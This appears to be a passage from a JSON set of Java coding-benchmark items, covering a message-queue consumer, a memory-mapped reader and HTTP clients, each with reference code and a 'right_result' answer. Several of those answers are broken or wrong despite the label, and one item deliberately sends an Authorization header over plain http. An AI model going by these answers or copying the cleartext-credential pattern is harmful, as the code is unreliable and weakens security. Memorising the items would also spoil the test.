[
  {
    "Task_id": 1,
    "Instruction": "Task Description: Create a Java class that implements an ActiveMQ message consumer capable of receiving messages from a specified queue, processing different message types (TextMessage and BytesMessage), and handling connection exceptions.\n\nClass Description: The ActiveMqConsumer class implements Runnable and ExceptionListener interfaces to asynchronously consume messages from an ActiveMQ broker while handling connection exceptions. It manages the JMS connection lifecycle and provides methods to start/stop the consumer.\n\nAttributes:\n- connection: Connection - JMS connection to the ActiveMQ broker\n- session: Session - JMS session for message processing\n- consumer: MessageConsumer - JMS message consumer for receiving messages\n- remoteUri: String - URI of the ActiveMQ broker\n- queueName: String - Name of the queue to consume messages from\n\nMethods:\n- ActiveMqConsumer(String remoteUri, String queueName) -> None - Constructor that initializes the broker URI and queue name\n- start() -> void - Creates connection factory, establishes connection, creates session and consumer\n- stop() -> void - Closes consumer, session and connection resources\n- run() -> void - Continuously receives and processes messages (TextMessage/BytesMessage)\n- onException(JMSException e) -> void - Exception handler that stops the consumer on connection errors\n- getConnection() -> Connection - Returns the JMS connection\n- getSession() -> Session - Returns the JMS session\n- getConsumer() -> MessageConsumer - Returns the message consumer",
    "Canonical_solution": "import javax.jms.BytesMessage;\nimport javax.jms.Connection;\nimport javax.jms.Destination;\nimport javax.jms.ExceptionListener;\nimport javax.jms.JMSException;\nimport javax.jms.Message;\nimport javax.jms.MessageConsumer;\nimport javax.jms.Session;\nimport javax.jms.TextMessage;\nimport org.apache.activemq.ActiveMQConnectionFactory;\nimport com.sitewhere.spi.SiteWhereException;\n\npublic class ActiveMqConsumer implements Runnable, ExceptionListener {\n\n    private Connection connection;\n    private Session session;\n    private MessageConsumer consumer;\n    private String remoteUri;\n    private String queueName;\n\n    public ActiveMqConsumer(String remoteUri, String queueName) {\n        this.remoteUri = remoteUri;\n        this.queueName = queueName;\n    }\n\n    public void start() throws SiteWhereException {\n        try {\n            ActiveMQConnectionFactory connectionFactory = new ActiveMQConnectionFactory(remoteUri);\n            this.connection = connectionFactory.createConnection();\n            this.connection.setExceptionListener(this);\n            this.connection.start();\n            this.session = this.connection.createSession(false, Session.AUTO_ACKNOWLEDGE);\n            Destination destination = this.session.createQueue(queueName);\n            this.consumer = this.session.createConsumer(destination);\n        } catch (Exception e) {\n            throw new SiteWhereException(\"Error starting ActiveMQ consumer.\", e);\n        }\n    }\n\n    public void stop() throws SiteWhereException {\n        try {\n            this.consumer.close();\n            this.session.close();\n            this.connection.close();\n        } catch (Exception e) {\n            throw new SiteWhereException(\"Error shutting down ActiveMQ consumer.\", e);\n        }\n    }\n\n    @Override\n    public void run() {\n        while (true) {\n            try {\n                Message message = consumer.receive();\n                if (message == null) {\n                    break;\n                }\n                if (message instanceof TextMessage) {\n                    TextMessage textMessage = (TextMessage) message;\n                    byte[] payload = textMessage.getText().getBytes();\n                    // Process payload here\n                } else if (message instanceof BytesMessage) {\n                    BytesMessage bytesMessage = (BytesMessage) message;\n                    byte[] buffer = new byte[(int) bytesMessage.getBodyLength()];\n                    // Process buffer here\n                }\n            } catch (Throwable e) {\n                return;\n            }\n        }\n    }\n\n    @Override\n    public void onException(JMSException e) {\n        try {\n            stop();\n        } catch (SiteWhereException e1) {\n        }\n    }\n\n    protected Connection getConnection() {\n        return connection;\n    }\n\n    protected Session getSession() {\n        return session;\n    }\n\n    protected MessageConsumer getConsumer() {\n        return consumer;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 39,
    "right_result": "```java\nimport javax.jms.*;\nimport org.apache.activemq.ActiveMQConnectionFactory;\n\npublic class ActiveMqConsumer implements Runnable, ExceptionListener {\n    private Connection connection;\n    private Session session;\n    private MessageConsumer consumer;\n    private String remoteUri;\n    private String queueName;\n\n    public ActiveMqConsumer(String remoteUri, String queueName) {\n        this.remoteUri = remoteUri;\n        this.queueName = queueName;\n    }\n\n    public void start() throws JMSException {\n        ConnectionFactory factory = new ActiveMQConnectionFactory(remoteUri);\n        connection = factory.createConnection();\n        connection.setExceptionListener(this);\n        connection.start();\n        session = connection.createSession(false, Session.AUTO_ACKNOWLEDGE);\n        Destination destination = session.createQueue(queueName);\n        consumer = session.createConsumer(destination);\n    }\n\n    public void stop() {\n        try {\n            if (consumer != null) consumer.close();\n            if (session != null) session.close();\n            if (connection != null) connection.close();\n        } catch (JMSException e) {\n            e.printStackTrace();\n        }\n    }\n\n    @Override\n    public void run() {\n        try {\n            while (true) {\n                Message message = consumer.receive(1000);\n                if (message instanceof TextMessage) {\n                    TextMessage textMessage = (TextMessage) message;\n                    System.out.println(\"Received Text Message: \" + textMessage.getText());\n                } else if (message instanceof BytesMessage) {\n                    BytesMessage bytesMessage = (BytesMessage) message;\n                    byte[] body = new byte[(int) bytesMessage.getBodyLength()];\n                    bytesMessage.readBytes(body);\n                    System.out.println(\"Received Bytes Message: \" + new String(body));\n                }\n            }\n        } catch (JMSException e) {\n            e.printStackTrace();\n        }\n    }\n\n    @Override\n    public void onException(JMSException e) {\n        System.err.println(\"JMS Exception occurred: \" + e.getMessage());\n        stop();\n    }\n\n    public Connection getConnection() {\n        return connection;\n    }\n\n    public Session getSession() {\n        return session;\n    }\n\n    public MessageConsumer getConsumer() {\n        return consumer;\n    }\n}\n```"
  },
  {
    "Task_id": 10,
    "Instruction": "Task Description: Create a Java class that provides read-only access to file contents using MemorySegment and FileChannel for efficient memory-mapped file operations.\n\nClass Description: MemorySegmentReaderSupplier is a utility class that implements ReaderSupplier interface, designed to provide memory-mapped file reading capabilities. It uses Java NIO's FileChannel to map a file into memory as a MemorySegment, allowing efficient read operations. The class manages memory resources through an Arena and automatically handles resource cleanup.\n\nAttributes:\n- arena: Arena - Manages the lifecycle of the memory segment and ensures proper cleanup\n- memory: MemorySegment - The memory-mapped representation of the file content\n\nMethods:\n- Constructor: MemorySegmentReaderSupplier(Path path) throws IOException - Initializes the reader by opening the specified file and mapping it into memory. Throws IOException if file operations fail.\n- get: get() -> MemorySegmentReader - Returns a new MemorySegmentReader instance for accessing the memory-mapped file content\n- close: close() -> void - Releases all allocated resources by closing the arena and unmapping the memory segment",
    "Canonical_solution": "import java.io.IOException;\nimport java.lang.foreign.Arena;\nimport java.lang.foreign.MemorySegment;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.Path;\nimport java.nio.file.StandardOpenOption;\n\npublic class MemorySegmentReaderSupplier implements ReaderSupplier {\n    private final Arena arena;\n    private final MemorySegment memory;\n\n    public MemorySegmentReaderSupplier(Path path) throws IOException {\n        this.arena = Arena.ofShared();\n        try (var ch = FileChannel.open(path, StandardOpenOption.READ)) {\n            this.memory = ch.map(FileChannel.MapMode.READ_ONLY, 0L, ch.size(), arena);\n        } catch (Throwable e) {\n            arena.close();\n            if (e instanceof IOException) {\n                throw (IOException) e;\n            }\n            throw new RuntimeException(e);\n        }\n    }\n\n    @Override\n    public MemorySegmentReader get() {\n        return new MemorySegmentReader(memory);\n    }\n\n    @Override\n    public void close() {\n        arena.close();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 9,
    "right_result": "```java\nimport java.io.IOException;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.Path;\nimport java.nio.file.StandardOpenOption;\nimport jdk.incubator.foreign.Arena;\nimport jdk.incubator.foreign.MemoryLayout;\nimport jdk.incubator.foreign.MemorySegment;\n\npublic class MemorySegmentReaderSupplier implements ReaderSupplier {\n    private final Arena arena;\n    private final MemorySegment memory;\n\n    public MemorySegmentReaderSupplier(Path path) throws IOException {\n        this.arena = Arena.openConfined();\n        try (FileChannel channel = FileChannel.open(path, StandardOpenOption.READ)) {\n            long fileSize = channel.size();\n            this.memory = arena.allocate(fileSize);\n            channel.read(memory.asSlice(0, fileSize));\n        }\n    }\n\n    @Override\n    public MemorySegmentReader get() {\n        return new MemorySegmentReader(this.memory);\n    }\n\n    @Override\n    public void close() {\n        this.arena.close();\n    }\n\n    public static class MemorySegmentReader {\n        private final MemorySegment memory;\n\n        public MemorySegmentReader(MemorySegment memory) {\n            this.memory = memory;\n        }\n\n        public byte getByte(long offset) {\n            return memory.get(ValueLayout.JAVA_BYTE, offset);\n        }\n\n        public short getShort(long offset) {\n            return memory.get(ValueLayout.JAVA_SHORT, offset);\n        }\n\n        public int getInt(long offset) {\n            return memory.get(ValueLayout.JAVA_INT, offset);\n        }\n\n        public long getLong(long offset) {\n            return memory.get(ValueLayout.JAVA_LONG, offset);\n        }\n\n        public float getFloat(long offset) {\n            return memory.get(ValueLayout.JAVA_FLOAT, offset);\n        }\n\n        public double getDouble(long offset) {\n            return memory.get(ValueLayout.JAVA_DOUBLE, offset);\n        }\n\n        public MemorySegment slice(long start, long length) {\n            return memory.slice(start, length);\n        }\n\n        public long size() {\n            return memory.byteSize();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 100,
    "Instruction": "Task Description: Create a Java class that handles HTTP requests for sending debug information to a server, including handling redirects and SSL connections.\n\nClass Description: HttpDebugIdSender is a utility class designed to send debug information to a specified server URL using HTTP POST requests. It handles JSON payload construction, SSL connections (when needed), and follows redirects if necessary. The class includes error logging and proper resource cleanup.\n\nAttributes:\n- distinctId: String - Unique identifier for the debug session\n- infoId: String - Additional information ID to be included in the URL\n- serverUrl: String - Base URL of the server to which debug information will be sent\n\nMethods:\n- HttpDebugIdSender(String serverUrl, String distinctId, String infoId) -> None - Constructor that initializes the class with server URL, distinct ID, and info ID\n- send() -> None - Initiates the HTTP request to send debug information\n- sendHttpRequest(String serverUrl, boolean isRedirects) -> None - Internal method that handles the actual HTTP request, including connection setup, payload sending, and response handling\n- closeStream(ByteArrayOutputStream out, OutputStream out2, BufferedOutputStream bout, HttpURLConnection connection) -> None - Helper method to safely close all open streams and connections",
    "Canonical_solution": "import android.content.Context;\nimport com.sensorsdata.analytics.android.sdk.SALog;\nimport com.sensorsdata.analytics.android.sdk.SensorsDataAPI;\nimport com.sensorsdata.analytics.android.sdk.util.NetworkUtils;\nimport com.sensorsdata.analytics.android.sdk.util.TimeUtils;\n\nimport java.io.BufferedOutputStream;\nimport java.io.ByteArrayOutputStream;\nimport java.io.OutputStream;\nimport java.io.OutputStreamWriter;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\nimport javax.net.ssl.HttpsURLConnection;\n\npublic class HttpDebugIdSender {\n    private String distinctId;\n    private String infoId;\n    private String serverUrl;\n\n    public HttpDebugIdSender(String serverUrl, String distinctId, String infoId) {\n        this.distinctId = distinctId;\n        this.infoId = infoId;\n        this.serverUrl = serverUrl;\n    }\n\n    public void send() {\n        sendHttpRequest(serverUrl, false);\n    }\n\n    private void sendHttpRequest(String serverUrl, boolean isRedirects) {\n        ByteArrayOutputStream out = null;\n        OutputStream out2 = null;\n        BufferedOutputStream bout = null;\n        HttpURLConnection connection = null;\n        try {\n            URL url = new URL(String.format(serverUrl + \"&info_id=%s\", infoId));\n            SALog.info(\"HttpDebugIdSender\", String.format(\"DebugMode URL:%s\", url), null);\n            connection = (HttpURLConnection) url.openConnection();\n            if (connection == null) {\n                SALog.info(\"HttpDebugIdSender\", String.format(\"can not connect %s,shouldn't happen\", url.toString()), null);\n                return;\n            }\n            SAConfigOptions configOptions = SensorsDataAPI.getConfigOptions();\n            if (configOptions != null && configOptions.getSSLSocketFactory() != null\n                    && connection instanceof HttpsURLConnection) {\n                ((HttpsURLConnection) connection).setSSLSocketFactory(configOptions.getSSLSocketFactory());\n            }\n            connection.setInstanceFollowRedirects(false);\n            out = new ByteArrayOutputStream();\n            OutputStreamWriter writer = new OutputStreamWriter(out);\n            String requestBody = \"{\\\"distinct_id\\\": \\\"\" + distinctId + \"\\\"}\";\n            writer.write(requestBody);\n            writer.flush();\n            SALog.info(\"HttpDebugIdSender\", String.format(\"DebugMode request body : %s\", requestBody), null);\n            connection.setDoOutput(true);\n            connection.setUseCaches(false);\n            connection.setRequestMethod(\"POST\");\n            connection.setRequestProperty(\"Content-type\", \"text/plain\");\n\n            out2 = connection.getOutputStream();\n            bout = new BufferedOutputStream(out2);\n            bout.write(out.toString().getBytes(\"UTF-8\"));\n            bout.flush();\n            out.close();\n            int responseCode = connection.getResponseCode();\n            SALog.info(\"HttpDebugIdSender\", String.format(TimeUtils.SDK_LOCALE, \"DebugMode ResponseCode: %d\", responseCode), null);\n            if (!isRedirects && NetworkUtils.needRedirects(responseCode)) {\n                String location = NetworkUtils.getLocation(connection, serverUrl);\n                if (!TextUtils.isEmpty(location)) {\n                    closeStream(out, out2, bout, connection);\n                    sendHttpRequest(location, true);\n                }\n            }\n        } catch (Exception e) {\n            SALog.printStackTrace(e);\n        } finally {\n            closeStream(out, out2, bout, connection);\n        }\n    }\n\n    private void closeStream(ByteArrayOutputStream out, OutputStream out2, BufferedOutputStream bout, HttpURLConnection connection) {\n        if (out != null) {\n            try {\n                out.close();\n            } catch (Exception e) {\n                SALog.printStackTrace(e);\n            }\n        }\n        if (out2 != null) {\n            try {\n                out2.close();\n            } catch (Exception e) {\n                SALog.printStackTrace(e);\n            }\n        }\n        if (bout != null) {\n            try {\n                bout.close();\n            } catch (Exception e) {\n                SALog.printStackTrace(e);\n            }\n        }\n        if (connection != null) {\n            try {\n                connection.disconnect();\n            } catch (Exception e) {\n                SALog.printStackTrace(e);\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "right_result": "```java\nimport java.io.ByteArrayOutputStream;\nimport java.io.IOException;\nimport java.io.OutputStream;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class HttpDebugIdSender {\n    private String distinctId;\n    private String infoId;\n    private String serverUrl;\n\n    public HttpDebugIdSender(String serverUrl, String distinctId, String infoId) {\n        this.serverUrl = serverUrl;\n        this.distinctId = distinctId;\n        this.infoId = infoId;\n    }\n\n    public void send() {\n        try {\n            sendHttpRequest(serverUrl + \"?distinctId=\" + distinctId + \"&infoId=\" + infoId, true);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private void sendHttpRequest(String serverUrl, boolean isRedirects) throws IOException {\n        URL url = new URL(serverUrl);\n        HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n        connection.setRequestMethod(\"POST\");\n        connection.setDoOutput(true);\n\n        ByteArrayOutputStream out = new ByteArrayOutputStream();\n        // Assuming jsonPayload is constructed here\n        String jsonPayload = \"{\\\"key\\\":\\\"value\\\"}\";\n        byte[] input = jsonPayload.getBytes(\"utf-8\");\n        out.write(input, 0, input.length);\n        out.flush();\n\n        OutputStream os = connection.getOutputStream();\n        os.write(out.toByteArray());\n        os.close();\n\n        int responseCode = connection.getResponseCode();\n        if (responseCode == HttpURLConnection.HTTP_MOVED_PERM || responseCode == HttpURLConnection.HTTP_MOVED_TEMP && isRedirects) {\n            String location = connection.getHeaderField(\"Location\");\n            sendHttpRequest(location, false);\n        } else if (responseCode != HttpURLConnection.HTTP_OK) {\n            throw new IOException(\"Failed : HTTP error code : \" + responseCode);\n        }\n\n        connection.disconnect();\n    }\n\n    private void closeStream(ByteArrayOutputStream out, OutputStream out2, BufferedOutputStream bout, HttpURLConnection connection) {\n        try {\n            if (out != null) out.close();\n            if (out2 != null) out2.close();\n            if (bout != null) bout.close();\n            if (connection != null) connection.disconnect();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 102,
    "Instruction": "Task Description: Create a Java class that demonstrates how to make an HTTP request using HttpURLConnection, including setting connection timeouts and request headers, and handling the response.\n\nClass Description: The CleartextHttpCredentialsTest class is designed to test basic HTTP connectivity with a target URL. It demonstrates how to establish a connection, set timeouts, add request headers, and retrieve response information. The class focuses on proper resource cleanup after the connection is used.\n\nAttributes:\n- TARGET: [String] - A constant storing the URL to which the HTTP request will be made\n\nMethods:\n- runTest: [runTest]() -> [void] - Executes the HTTP request to the target URL. Sets connection timeouts, adds an Authorization header, retrieves the response code and message, and ensures proper connection cleanup. Throws Exception if any step fails.",
    "Canonical_solution": "import java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class CleartextHttpCredentialsTest {\n\n  private static final String TARGET = \"http://www.google.com\";\n\n  public void runTest() throws Exception {\n    HttpURLConnection connection = null;\n    try {\n      connection = (HttpURLConnection) new URL(TARGET).openConnection();\n      connection.setConnectTimeout(20000);\n      connection.setReadTimeout(20000);\n      connection.setRequestProperty(\"Authorization\", \"value\");\n      int responseCode = connection.getResponseCode();\n      String responseMessage = connection.getResponseMessage();\n    } finally {\n      if (connection != null) {\n        connection.disconnect();\n      }\n    }\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "right_result": "```java\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class CleartextHttpCredentialsTest {\n    private static final String TARGET = \"https://example.com/api\";\n\n    public void runTest() throws Exception {\n        URL url = new URL(TARGET);\n        HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n        \n        try {\n            conn.setConnectTimeout(5000); // 5 seconds\n            conn.setReadTimeout(5000); // 5 seconds\n            conn.setRequestMethod(\"GET\");\n            conn.setRequestProperty(\"Authorization\", \"Bearer your_access_token_here\");\n\n            int responseCode = conn.getResponseCode();\n            System.out.println(\"Response Code: \" + responseCode);\n\n            BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));\n            String inputLine;\n            StringBuilder content = new StringBuilder();\n            while ((inputLine = in.readLine()) != null) {\n                content.append(inputLine);\n            }\n            in.close();\n\n            System.out.println(\"Response Content: \" + content.toString());\n        } finally {\n            conn.disconnect();\n        }\n    }\n\n    public static void main(String[] args) {\n        CleartextHttpCredentialsTest test = new CleartextHttpCredentialsTest();\n        try {\n            test.runTest();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 104,
    "Instruction": "Task Description: Create a function that performs an HTTP/HTTPS request with XML data and parses the XML response into a key-value map.\n\nFunction Description: This function sends an HTTP/HTTPS request (GET/POST) to a specified URL with XML data as input, then parses the XML response into a Map<String, Object> where keys are XML element names and values are their text content. The function handles connection setup, request configuration, data transmission, response parsing, and resource cleanup.\n\nInput:\n- requestUrl: String - The target URL for the HTTP request\n- requestMethod: String - The HTTP method to use (e.g., \"GET\" or \"POST\")\n- xmlStr: String - The XML data to send with the request (can be null for GET requests)\n\nOutput:\n- Map<String, Object> - A map containing key-value pairs parsed from the XML response, where keys are XML element names and values are their text content",
    "Canonical_solution": "import java.io.IOException;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.io.OutputStream;\nimport java.net.MalformedURLException;\nimport java.net.URL;\nimport java.util.Map;\nimport java.util.HashMap;\nimport javax.net.ssl.HttpsURLConnection;\n\npublic static Map<String, Object> httpXmlRequest(String requestUrl, String requestMethod, String xmlStr) {\n    Map<String, Object> map = new HashMap<String, Object>();\n    try {\n        HttpsURLConnection urlCon = (HttpsURLConnection) (new URL(requestUrl)).openConnection();\n        urlCon.setDoInput(true);\n        urlCon.setDoOutput(true);\n        urlCon.setRequestMethod(requestMethod);\n\n        if (\"GET\".equalsIgnoreCase(requestMethod)) {\n            urlCon.connect();\n        }\n\n        urlCon.setRequestProperty(\"Content-Length\", String.valueOf(xmlStr.getBytes().length));\n        urlCon.setUseCaches(false);\n        if (null != xmlStr) {\n            OutputStream outputStream = urlCon.getOutputStream();\n            outputStream.write(xmlStr.getBytes(\"UTF-8\"));\n            outputStream.flush();\n            outputStream.close();\n        }\n        InputStream inputStream = urlCon.getInputStream();\n        InputStreamReader inputStreamReader = new InputStreamReader(inputStream, \"UTF-8\");\n        SAXReader reader = new SAXReader();\n        Document document = reader.read(inputStreamReader);\n        Element root = document.getRootElement();\n        List<Element> elementList = root.elements();\n        for (Element e : elementList) {\n            map.put(e.getName(), e.getText());\n        }\n        inputStreamReader.close();\n        inputStream.close();\n        inputStream = null;\n        urlCon.disconnect();\n    } catch (MalformedURLException e) {\n        LOG.error(e.getMessage());\n    } catch (IOException e) {\n        LOG.error(e.getMessage());\n    } catch (Exception e) {\n        LOG.error(e.getMessage());\n    }\n    return map;\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 16,
    "right_result": "```java\nimport java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.io.OutputStream;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.util.HashMap;\nimport java.util.Map;\nimport javax.xml.parsers.DocumentBuilder;\nimport javax.xml.parsers.DocumentBuilderFactory;\nimport org.w3c.dom.Document;\nimport org.w3c.dom.Element;\nimport org.w3c.dom.NodeList;\n\npublic class XmlHttpRequest {\n\n    public static Map<String, Object> performRequest(String requestUrl, String requestMethod, String xmlStr) throws IOException {\n        Map<String, Object> result = new HashMap<>();\n        URL url = new URL(requestUrl);\n        HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n        conn.setRequestMethod(requestMethod);\n\n        if (\"POST\".equalsIgnoreCase(requestMethod)) {\n            conn.setDoOutput(true);\n            try (OutputStream os = conn.getOutputStream()) {\n                byte[] input = xmlStr.getBytes(\"utf-8\");\n                os.write(input, 0, input.length);           \n            }\n        }\n\n        int responseCode = conn.getResponseCode();\n        if (responseCode == HttpURLConnection.HTTP_OK) { // success\n            try (BufferedReader br = new BufferedReader(\n                    new InputStreamReader(conn.getInputStream(), \"utf-8\"))) {\n                StringBuilder response = new StringBuilder();\n                String responseLine = null;\n                while ((responseLine = br.readLine()) != null) {\n                    response.append(responseLine.trim());\n                }\n                DocumentBuilderFactory dbFactory = DocumentBuilderFactory.newInstance();\n                DocumentBuilder dBuilder = dbFactory.newDocumentBuilder();\n                Document doc = dBuilder.parse(new java.io.ByteArrayInputStream(response.toString().getBytes()));\n                doc.getDocumentElement().normalize();\n                parseXml(doc.getDocumentElement(), result);\n            }\n        } else {\n            throw new RuntimeException(\"Failed : HTTP error code : \"\n                    + responseCode);\n        }\n        conn.disconnect();\n        return result;\n    }\n\n    private static void parseXml(Element node, Map<String, Object> resultMap) {\n        NodeList nodeList = node.getChildNodes();\n        for (int i = 0; i < nodeList.getLength(); i++) {\n            Node currentNode = nodeList.item(i);\n            if (currentNode.getNodeType() == Node.ELEMENT_NODE) {\n                Element element = (Element) currentNode;\n                resultMap.put(element.getNodeName(), element.getTextContent());\n                parseXml(element, resultMap);\n            }\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 105,
    "Instruction": "Task Description: Create a Java class that implements HTTP client functionality using HttpURLConnection for making HTTP requests and handling responses.\n\nClass Description: The Http class provides a static method for sending HTTP requests to a specified URL with configurable request methods and payloads. It handles connection setup, request sending, response reading, and resource cleanup.\n\nMethods:\n\nMethod1: httpsRequest(String requestUrl, String requestMethod, String outputStr) -> String - Sends an HTTP request to the specified URL using the given method and optional request body, then returns the response as a string.\n  - requestUrl: String - The target URL for the HTTP request\n  - requestMethod: String - The HTTP method to use (e.g., \"GET\", \"POST\")\n  - outputStr: String - The request body to send (can be null for requests without body)\n  - Returns: String - The response body from the server, or null if an error occurs\n\nThe method handles:\n1. Creating and configuring HttpURLConnection\n2. Setting request headers (content-type: text/xml; charset=UTF-8)\n3. Sending request body if provided\n4. Reading and concatenating response\n5. Proper resource cleanup\n6. Error handling and logging",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.io.OutputStream;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport com.scudata.common.Logger;\n\npublic class Http {\n    public static String httpsRequest(String requestUrl, String requestMethod, String outputStr) {    \n        try {    \n            URL url = new URL(requestUrl);    \n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();    \n              \n            conn.setDoOutput(true);    \n            conn.setDoInput(true);    \n            conn.setUseCaches(false);    \n            conn.setRequestMethod(requestMethod);    \n            conn.setRequestProperty(\"content-type\", \"text/xml; charset=UTF-8\");\n            \n            if (null != outputStr) {    \n                OutputStream outputStream = conn.getOutputStream();    \n                outputStream.write(outputStr.getBytes(\"UTF-8\"));    \n                outputStream.close();    \n            }    \n            \n            InputStream inputStream = conn.getInputStream();    \n            InputStreamReader inputStreamReader = new InputStreamReader(inputStream, \"utf-8\");    \n            BufferedReader bufferedReader = new BufferedReader(inputStreamReader);    \n            String str = null;  \n            StringBuffer buffer = new StringBuffer();    \n            while ((str = bufferedReader.readLine()) != null) {    \n                buffer.append(str);    \n            }    \n            \n            bufferedReader.close();    \n            inputStreamReader.close();    \n            inputStream.close();    \n            inputStream = null;    \n            conn.disconnect();    \n            return buffer.toString();    \n        } catch (Exception e) {    \n            System.out.println(\"http exception{}\"+ e);\n            Logger.error(e.getMessage());\n        }    \n        return null;    \n    }    \n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "right_result": "```java\nimport java.io.BufferedReader;\nimport java.io.DataOutputStream;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class Http {\n    public static String httpsRequest(String requestUrl, String requestMethod, String outputStr) {\n        HttpURLConnection conn = null;\n        BufferedReader reader = null;\n        try {\n            URL url = new URL(requestUrl);\n            conn = (HttpURLConnection) url.openConnection();\n            conn.setRequestMethod(requestMethod);\n            conn.setRequestProperty(\"Content-Type\", \"text/xml; charset=UTF-8\");\n            if (\"POST\".equalsIgnoreCase(requestMethod)) {\n                conn.setDoOutput(true);\n                DataOutputStream wr = new DataOutputStream(conn.getOutputStream());\n                wr.writeBytes(outputStr);\n                wr.flush();\n                wr.close();\n            }\n            int responseCode = conn.getResponseCode();\n            if (responseCode == HttpURLConnection.HTTP_OK) {\n                StringBuilder response = new StringBuilder();\n                reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));\n                String line;\n                while ((line = reader.readLine()) != null) {\n                    response.append(line);\n                }\n                return response.toString();\n            } else {\n                System.err.println(\"Failed : HTTP error code : \" + responseCode);\n                return null;\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n            return null;\n        } finally {\n            if (reader != null) {\n                try {\n                    reader.close();\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n            if (conn != null) {\n                conn.disconnect();\n            }\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 109,
    "Instruction": "Task Description: Create a Java class that handles HTTP requests using HttpURLConnection, supporting both GET and POST methods with configurable timeouts and headers.\n\nClass Description: The RealRequest class provides functionality to make HTTP GET and POST requests with configurable connection settings. It handles request creation, header management, response processing, and error handling.\n\nAttributes:\n- sRequestURL: String - Static field storing the last requested URL\n- httpConfig: HttpConfig - Configuration object for connection settings (timeouts, etc.)\n- TAG: String - Constant for logging purposes (value: \"SA.HttpRequest\")\n\nMethods:\n- getData(String requestURL, Map<String, String> headerMap) -> RealResponse - Performs a GET request to the specified URL with optional headers\n- postData(String requestURL, String body, String bodyType, Map<String, String> headerMap) -> RealResponse - Performs a POST request with request body, content type, and optional headers\n- getHttpURLConnection(String requestURL, String requestMethod) -> HttpURLConnection - Creates and configures an HttpURLConnection instance\n- setHeader(HttpURLConnection conn, Map<String, String> headerMap) -> void - Applies headers to the connection\n- getRealResponse(HttpURLConnection conn) -> RealResponse - Processes the HTTP response into a standardized format\n- getExceptionResponse(Exception e) -> RealResponse - Creates an error response from an exception\n- setHttpConfig(HttpConfig httpConfig) -> RealRequest - Sets the HTTP configuration (builder pattern)",
    "Canonical_solution": "import android.text.TextUtils;\nimport com.sensorsdata.analytics.android.sdk.SAConfigOptions;\nimport com.sensorsdata.analytics.android.sdk.SALog;\nimport com.sensorsdata.analytics.android.sdk.SensorsDataAPI;\nimport java.io.BufferedWriter;\nimport java.io.IOException;\nimport java.io.OutputStreamWriter;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.util.Map;\nimport javax.net.ssl.HttpsURLConnection;\nimport static com.sensorsdata.analytics.android.sdk.util.Base64Coder.CHARSET_UTF8;\n\nclass RealRequest {\n    private static final String TAG = \"SA.HttpRequest\";\n    private static String sRequestURL;\n    private HttpConfig httpConfig = new HttpConfig();\n\n    RealResponse getData(String requestURL, Map<String, String> headerMap) {\n        try {\n            SALog.i(TAG, String.format(\"url:%s,\\nmethod:GET\", requestURL));\n            sRequestURL = requestURL;\n            HttpURLConnection conn = getHttpURLConnection(requestURL, \"GET\");\n            if (headerMap != null) {\n                setHeader(conn, headerMap);\n            }\n            conn.connect();\n            return getRealResponse(conn);\n        } catch (Exception e) {\n            return getExceptionResponse(e);\n        }\n    }\n\n    RealResponse postData(String requestURL, String body, String bodyType, Map<String, String> headerMap) {\n        BufferedWriter writer = null;\n        try {\n            HttpURLConnection conn;\n            sRequestURL = requestURL;\n            SALog.i(TAG, String.format(\"url:%s\\nparams:%s\\nmethod:POST\", requestURL, body));\n            conn = getHttpURLConnection(requestURL, \"POST\");\n            conn.setDoOutput(true);\n            conn.setUseCaches(false);\n            if (!TextUtils.isEmpty(bodyType)) {\n                conn.setRequestProperty(\"Content-Type\", bodyType);\n            }\n            if (headerMap != null) {\n                setHeader(conn, headerMap);\n            }\n            conn.connect();\n            if (!TextUtils.isEmpty(body)) {\n                writer = new BufferedWriter(new OutputStreamWriter(conn.getOutputStream(), CHARSET_UTF8));\n                writer.write(body);\n                writer.flush();\n            }\n            return getRealResponse(conn);\n        } catch (Exception e) {\n            return getExceptionResponse(e);\n        } finally {\n            if (writer != null) {\n                try {\n                    writer.close();\n                } catch (IOException e) {\n                    SALog.printStackTrace(e);\n                }\n            }\n        }\n    }\n\n    private HttpURLConnection getHttpURLConnection(String requestURL, String requestMethod) throws IOException {\n        URL url = new URL(requestURL);\n        HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n        conn.setRequestMethod(requestMethod);\n        conn.setUseCaches(false);\n        conn.setConnectTimeout(httpConfig.getConnectionTimeout());\n        